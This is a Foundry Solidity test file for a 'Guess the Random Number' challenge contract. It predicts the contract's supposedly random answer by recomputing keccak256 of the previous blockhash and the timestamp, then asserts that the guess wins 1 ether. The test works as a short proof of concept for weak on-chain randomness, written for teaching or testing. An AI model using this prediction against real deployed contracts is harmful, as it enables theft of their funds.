
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {GuessTheRandomNumberChallenge} from "../src/GuessTheRandomNumberChallenge.sol";

contract TestWeakRandomnessGuessTheRandomNumberChallenge is Test {

    GuessTheRandomNumberChallenge public _contractUnderTest;
    
    uint256 deploymentBlockNumber;
    uint256 deploymentTimestamp;

    function setUp() public {
        vm.deal(address(this), 10 ether);
        
        deploymentBlockNumber = block.number;
        deploymentTimestamp = block.timestamp;
        
        _contractUnderTest = new GuessTheRandomNumberChallenge{value: 1 ether}();
    }

    function test_highlightPredictableRandomValue(uint256 blockTimestamp, uint256 blockNumber) public {
        
        vm.assume(blockNumber > 0);
        vm.assume(blockNumber >= 1);
        vm.assume(blockTimestamp >= 1);
        vm.assume(blockTimestamp < type(uint128).max);
        vm.assume(blockNumber < type(uint128).max);

        vm.roll(blockNumber);
        vm.warp(blockTimestamp);
        
        vm.deal(address(this), 10 ether);
        
        GuessTheRandomNumberChallenge challengeContract = new GuessTheRandomNumberChallenge{value: 1 ether}();
        
        uint8 predictedAnswer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
        
        uint256 balanceBefore = address(this).balance;
        
        challengeContract.guess{value: 1 ether}(predictedAnswer);
        
        uint256 balanceAfter = address(this).balance;
        
        assertEq(balanceAfter, balanceBefore + 1 ether, "Should have won 1 ether profit (sent 1, received 2)");
        assertTrue(challengeContract.isComplete(), "Challenge should be complete after correct guess");
    }

    receive() external payable {}
}
